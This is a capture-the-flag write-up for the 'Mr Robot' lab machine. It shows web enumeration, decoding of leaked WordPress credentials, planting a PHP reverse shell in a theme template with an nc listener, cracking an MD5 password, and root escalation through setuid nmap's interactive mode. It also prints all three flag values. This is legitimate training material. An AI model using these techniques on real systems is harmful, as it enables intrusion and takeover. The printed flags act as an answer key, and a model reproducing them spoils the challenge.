# Mr Robot CTF

## Description

Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

Credit to Leon Johnson for creating this machine.

# #1 - What is key 1?

*Hint: Robots*

Let's get started with a Nmap scan. Nmap reveals 3 ports, 2 of which are opened (http and https). SSH seems to be closed.

~~~
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
~~~

Let's start with the web server. Assisted by the hint, let's get the `robots.txt` file. It discloses 2 hidden files, 1 of which being the key 1.

~~~
$ curl -s http://10.10.185.196/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
unknown@localhost:/data/documents/challenges/TryHackMe/Mr_Robot_CTF$ curl -s http://10.10.185.196/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
~~~

The second file is a dictionary, that we will probably need to use for the discovery of other locations.

~~~
$ head fsocity.dic 
true
false
wikia
from
the
now
Wikia
extensions
scss
window
~~~

Key1: `073403c8a58a1f80d943455fb30724b9`

# #2 - What is key 2?

*Hint: White coloured font*

gobuster discovers several locations, including:
* /login (Status: 302)
* /wp-content (Status: 301)
* /admin (Status: 301)
* /wp-login (Status: 200)
* /license (Status: 200)
* /wp-includes (Status: 301)

Worpress is installed. Moreover, the directory `/license` discloses credentials:

~~~
$ curl -s http://10.10.185.196/license | tr -d "\n"
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?do you want a password or something?ZWxsaW90OkVSMjgtMDY1Mgo=

$ echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
elliot:ER28-0652
~~~

Let's try to use these credentials against Wordpress. It works and we are logged in as administrator! Several points to note here:

* The WordPress version is 4.3.1. Considering the current version is 5.4.1, we are likely to find vulnerabilities.
* There are 2 users:

username | Name | email | profile
---|---|---|---
elliot | Elliot Alderson | elliot@mrrobot.com | Administrator
mich05654 | krista Gordon | kgordon@therapist.com | Subscriber

As we are administrators, we can modify the templates. Go to Appearance > Editor and edit the first template (404.php) by replacing the PHP code with a reverse shell taken from [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php). Make sure you put your local IP.

Now open a listener:

~~~
$ nc -nlvp 1234
~~~

And visit `http://10.10.185.196/404.php` to open the reverse shell.

We see our next key in `/home/robot` but it is only readable by the `robot` user.

~~~
$ ls -l /home/robot/
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
$ whoami
daemon
~~~

We are also provided with the MD5 hash of Mr Robot's password:
~~~
$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
~~~

This hash was found [here](https://md5.gromweb.com/?md5=c3fcd3d76192e4007dfb496cca67e13b) and the associated password is `abcdefghijklmnopqrstuvwxyz`. Let's try to log in as `robot`.

~~~
$ su - robot
su: must be run from a terminal
~~~

Error... OK, not a problem, let's spawn a shell with python (we first confirm python is installed):

~~~
$ which python
/usr/bin/python
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ su - robot
su - robot
Password: abcdefghijklmnopqrstuvwxyz
$ whoami
whoami
robot
$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
~~~

# #3 - What is key 3?

*Hint: nmap*

Our last key is very likely in the `/root` directory, and we will need a privilege escalation to access it.

The nmap scan reveals that the port 22 (ssh) is closed, probably because the service is not started. We would need to elevate our privileges.

Unfortunately, our user `robot` is not in the sudoers:

~~~
$ sudo -l
sudo -l
[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.
~~~

OK, let's find what programs we have with the `SETUID` bit set owned by `root`:

~~~
$ find / -user root -perm -4000 -print 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
~~~

Interestingly, nmap is on the list (it's also the hint BTW). Besides, it's a very old release (3.81), considering that the current release is 7.80 at the time of this writing.

~~~
$ which nmap
which nmap
/usr/local/bin/nmap
$ nmap --version
nmap --version

nmap version 3.81 ( http://www.insecure.org/nmap/ )
~~~

As described [here](https://pentestlab.blog/category/privilege-escalation/), nmap is its older release (2.02 to 5.21) had an interactive mode which allows to execute commands.

Besides, nmap has the `SETUID` bit set, which means that we will be able to run commands as root:

~~~
$ ls -l /usr/local/bin/nmap
ls -l /usr/local/bin/nmap
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
~~~

Let's start `nmap` in interactive mode:

~~~
$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !whoami
!whoami
root
waiting to reap child : No child processes
nmap> !ls /root
!ls /root
firstboot_done	key-3-of-3.txt
waiting to reap child : No child processes
nmap> !cat /root/key-3-of-3.txt
!cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
waiting to reap child : No child processes
~~~

3rd key: `04787ddef27c3dee1ee161b21670b4e4`